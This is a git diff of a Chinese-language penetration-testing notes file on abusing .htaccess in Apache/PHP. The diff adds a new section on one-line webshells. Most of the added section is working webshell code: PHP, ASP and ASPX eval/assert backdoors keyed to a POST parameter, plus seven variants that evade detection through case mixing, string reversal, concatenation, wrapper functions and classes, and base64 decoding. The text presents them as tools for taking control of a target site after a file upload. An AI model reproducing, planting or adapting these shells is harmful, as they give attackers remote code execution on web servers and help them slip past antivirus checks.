@@ -111,6 +111,8 @@ windows编辑2.xx
 
 **第二种、FastCGI启动方式**
 
+> pwd:`htaccess/2.1.5/2/.htaccess`
+
 windows下的.htaccess:
 
 ```
@@ -141,6 +143,8 @@ FcgidWrapper "whoami" .abc
 
 #### 2) AddType指定后缀文件解析类型
 
+> pwd:htaccess/2.2/.htaccess
+
 ```
 AddType application/x-httpd-php .a
 ```
@@ -156,6 +160,8 @@ AddType application/x-httpd-php .a
 [php.ini配置选项列表](https://www.php.net/manual/zh/ini.list.php)查看可以用配置项
 
 **1. 文件包含**
+
+> pwd:htaccess/2.3.1/.htaccess
 
 > - `auto_prepend_file`：指定一个文件，在主文件解析之前自动解析
 > - `auto_append_file`：指定一个文件，在主文件解析后自动解析
@@ -184,6 +190,8 @@ php_value auto_append_file webshell.a
 
 **2. 绕过preg_math的配置**
 
+> pwd:htaccess/2.3.2/.htaccess
+
 编辑.htaccess：
 
 ```
@@ -194,6 +202,8 @@ php_value pcre.jit 0
 这样就能绕过preg_math的正则匹配。
 
 #### 4) 直接使用.htaccess shell
+
+> pwd:2.4
 
 .htaccess文件：
 
@@ -235,4 +245,137 @@ php_value auto_prepend_file php://filter/convert.base64-decode/resource=webshell
 
 然后上传的webshell.a为base64加密后的文件。
 
-## 0x02 
+## 0x02 一句话木马
+
+### 1. 简介
+
+在很多的渗透过程中，渗透人员会上传一句话木马（**简称Webshell**）到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此
+
+先来看看最简单的一句话木马：
+
+```
+<?php @eval($_POST['A1ertx5s']) ?>
+```
+
+【基本原理】利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过蚁剑即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST['A1ertx5s']表示从页面中获得A1ertx5s这个参数值。
+
+### 2. 入侵条件
+
+其中，只要攻击者满足三个条件，就能实现成功入侵：
+
+- 木马上传成功，未被杀
+- 知道木马的路径在哪
+- 上传的木马能正常运行
+
+### 3. 常见的一句话木马
+
+#### PHP
+
+```
+<?php @eval($_POST[A1ertx5s]) ?>
+<?php @assert($_POST[A1ertx5s]) ?>
+```
+
+#### asp
+
+```
+<%eval request("A1ertx5s")%>
+```
+
+#### aspx
+
+```
+<@ Page Language="Jscript"> <%eval(Request.Item["A1ertx5s"], "unsafe");%>
+```
+
+### 4. Bypass
+
+#### 1) 大小写混淆配合字符串关键函数strtolower
+
+```php
+<?php
+$a = "AssErT";
+$b = strtolower($a);
+$b($_POST["A1ertx5s"]);
+?>
+```
+
+#### 2) 字符串逆序配合大小写混淆，关键函数strtolower、strrev
+
+```php
+<?php
+$a = "TrEsSA";
+$b = strtolower($a);
+$c = strrev($b);
+$c($_POST['A1ertx5s']);
+?>
+```
+
+#### 3) 字符串逆序、大小写混淆、字符串拼接
+
+````php
+<?php
+$a = "Tr"."Es"."SA";$b = strtolower($a);
+$c = strrev($b);
+$c($_POST['A1ertx5s']);
+?>
+````
+
+#### 4) 定义函数
+
+```php
+<?php
+    function gkey($a){
+    	@eval($a);
+	}
+	gkey($_POST['A1ertx5s']);
+?>
+```
+
+#### 5) 定义类
+
+```php
+<?php
+    class RKey{
+    	public function gkey($a){
+            @eval($a);
+        }
+	}
+	$key = new RKey;
+	$key -> gkey($_POST['A1ertx5s']);
+?>
+```
+
+#### 6) 定义类、使用base64编码函数
+
+```php
+<?php
+    class RKey{
+    	public function gkey($a){
+            @eval(base64_decode($a));
+        }
+	}
+	$key = new RKey;
+	$key -> gkey($_POST['A1ertx5s']);
+?>
+```
+
+#### 7) 定义函数、base64编码
+
+```php
+<?php
+    function gkey($a){
+    	@eval($a);
+	}
+	gkey(base64_decode($_POST['A1ertx5s']));
+?>
+```
+
+目前就整理这么多。
+
+
+
+
+
+
+
